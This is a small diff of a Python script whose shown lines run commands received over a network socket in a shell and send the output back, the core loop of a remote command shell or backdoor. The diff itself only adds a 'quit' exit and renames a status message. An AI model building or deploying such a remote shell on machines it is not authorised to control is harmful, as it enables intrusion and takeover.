@@ -39,6 +39,8 @@ while 1:
             proc = subprocess.Popen(exec_code, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             stdout_value = proc.stdout.read() + proc.stderr.read()
             connection_socket.send(stdout_value)
+        if exec_code == "quit":
+            break
     except:
             pass
 #    print("waiting")
@@ -52,4 +54,4 @@ while 1:
 #        data += tmpBuff
 #print (data)
 connection_socket.close()
-print("socket closed")
+print("Command Socket Closed")
